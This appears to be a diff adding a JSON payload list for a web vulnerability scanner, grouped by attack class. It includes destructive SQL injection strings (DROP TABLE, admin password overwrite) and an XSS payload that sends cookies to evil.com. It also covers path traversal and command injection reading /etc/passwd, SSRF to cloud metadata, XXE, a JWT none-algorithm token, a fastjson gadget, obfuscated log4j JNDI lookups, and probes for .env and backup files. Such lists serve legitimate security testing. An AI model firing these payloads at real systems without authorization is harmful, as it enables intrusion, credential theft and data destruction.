@@ -1,0 +1,97 @@
+{
+  "sql_injection": {
+    "error_based": [
+      "' OR '1'='1",
+      "1; SELECT * FROM users--",
+      "1' UNION SELECT null--",
+      "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+      "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--"
+    ],
+    "blind_boolean": [
+      "1' AND 1=1--",
+      "1' AND 1=2--",
+      "1' OR 1=1--",
+      "1' AND (SELECT COUNT(*) FROM users)>0--"
+    ],
+    "blind_time": [
+      "1' AND SLEEP(5)--",
+      "1' AND BENCHMARK(10000000,SHA1('test'))--",
+      "1' WAITFOR DELAY '0:0:5'--",
+      "1'; SELECT pg_sleep(5)--"
+    ],
+    "stacked": [
+      "1; DROP TABLE users--",
+      "1; INSERT INTO users VALUES('admin','hacked')--",
+      "1; UPDATE users SET password='hacked' WHERE username='admin'--"
+    ]
+  },
+  "xss": {
+    "reflected": [
+      "<script>alert(1)</script>",
+      "\"><img src=x onerror=alert(1)>",
+      "'-alert(1)-'",
+      "<svg onload=alert(1)>",
+      "javascript:alert(1)"
+    ],
+    "stored": [
+      "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>",
+      "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"
+    ],
+    "template_injection": [
+      "{{7*7}}",
+      "${7*7}",
+      "<%= 7*7 %>",
+      "#{7*7}",
+      "{{config}}"
+    ]
+  },
+  "path_traversal": [
+    "../../../etc/passwd",
+    "....//....//....//etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "..\\..\\..\\windows\\system32\\config\\sam",
+    "....\/....\/....\/etc\/passwd",
+    "%252e%252e%252f"
+  ],
+  "command_injection": [
+    "; cat /etc/passwd",
+    "| cat /etc/passwd",
+    "`cat /etc/passwd`",
+    "$(cat /etc/passwd)",
+    "& ping -c 5 127.0.0.1 &",
+    "|| ping -c 5 127.0.0.1"
+  ],
+  "ssrf": [
+    "http://127.0.0.1",
+    "http://localhost",
+    "http://169.254.169.254/latest/meta-data/",
+    "http://[::1]",
+    "http://0177.0.0.1",
+    "file:///etc/passwd",
+    "dict://127.0.0.1:6379/"
+  ],
+  "xxe": [
+    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/\">]><foo>&xxe;</foo>"
+  ],
+  "jwt": {
+    "none_algorithm": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
+    "weak_secret": ["secret", "password", "123456", "admin", "key"]
+  },
+  "deserialization": {
+    "java": "O:12:\"VulnerableClass\":0:{}",
+    "fastjson": "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\",\"autoCommit\":true}"
+  },
+  "log4j": [
+    "${jndi:ldap://127.0.0.1/a}",
+    "${jndi:rmi://127.0.0.1/a}",
+    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1/a}"
+  ],
+  "common_endpoints": {
+    "swagger": ["/swagger-ui.html", "/swagger-ui/", "/v2/api-docs", "/v3/api-docs", "/swagger-resources"],
+    "actuator": ["/actuator", "/actuator/health", "/actuator/env", "/actuator/configprops"],
+    "debug": ["/debug", "/trace", "/console", "/admin"],
+    "backup": ["/backup", "/backup.sql", "/db.sql", "/dump.sql", "/.bak"],
+    "config": ["/.env", "/config.json", "/config.js", "/application.yml", "/web.config"]
+  }
+}
